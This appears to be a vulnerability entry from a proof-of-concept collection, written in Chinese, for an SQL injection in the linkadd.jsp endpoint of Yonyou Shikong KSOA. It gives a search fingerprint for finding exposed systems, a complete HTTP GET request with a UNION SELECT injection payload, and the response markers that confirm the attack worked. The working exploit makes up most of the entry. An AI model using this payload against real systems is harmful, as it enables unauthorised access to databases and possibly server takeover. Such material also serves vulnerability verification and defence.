﻿# 用友时空 KSOA linkadd.jsp SQL注入

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：用友时空KSOAlinksframe/linkadd.jsp接口存在SQL注入漏洞，攻击者可利用漏洞获取数据库敏感信息，甚至获取服务器权限。

> 漏洞特征：title="企业信息系统门户"

> 验证脚本：HTTP

```
GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27 HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：49ba59abbe56e057

> 上传文件定位：

> 验证文件来源：用友时空 KSOA linkadd.jsp SQL注入.poc

